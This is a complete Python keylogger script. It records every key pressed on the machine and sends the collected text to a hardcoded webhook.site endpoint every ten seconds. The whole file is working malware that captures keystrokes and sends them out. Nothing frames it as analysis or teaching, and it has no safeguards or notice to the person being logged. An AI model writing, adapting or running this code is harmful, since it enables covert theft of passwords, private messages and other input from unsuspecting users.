import keyboard
import requests
import json
import threading

text = ""
webhookUrl = "https://webhook.site/5eb26f68-3adb-457a-9706-adf63da9b55c"
time_interval = 10

def send_post_req():
    global text
    try:
        payload = json.dumps({"Keyboard input": text})
        r = requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "application/json"})
        text = ""  # Reset the text after sending
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def log_keys(e):
    global text
    text += e.name if len(e.name) == 1 else f"[{e.name}]"

keyboard.on_press(log_keys)

send_post_req()
keyboard.wait()  # Keeps the program running
